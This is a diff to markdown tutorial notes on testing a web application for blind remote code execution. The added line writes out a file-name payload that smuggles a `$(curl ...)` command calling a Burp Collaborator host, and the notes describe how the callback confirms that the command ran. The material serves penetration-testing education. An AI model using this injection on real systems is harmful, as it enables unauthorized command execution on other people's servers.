@@ -29,7 +29,10 @@ As expected, nothing has worked.
 From previous tests, we can see that nothing is really working. It's not giving us an RCE. 
 In this case, ==we have to test for a blind RCE.== I know we haven't covered this previously in our slides. It's almost the same as an RCE; we just have to find a different way to see the output of a command.
 
-This could be done in several ways. The first thing we can try is sending a cURL request. We can say, "Hey, I want you to make a cURL command," and use a Burp Collaborator link. We copy the link and tell it to send the request to our Burp Collaborator, hoping that this command gets executed.
+This could be done in several ways. The first thing we can try is sending a cURL request. We can say, "Hey, I want you to make a cURL command,"   `( filename="test123 $(curl Burp-collaborator-payload-link ).png)`
+
+and use a Burp Collaborator link. We copy the link and tell it to send the request to our Burp Collaborator, hoping that this command gets executed.
+
 
 We send this out and hope for a hit. We poll for responses and see that we are getting a request sent to our Burp Collaborator. It comes from a user agent with cURL, which indicates that our command has executed.
 
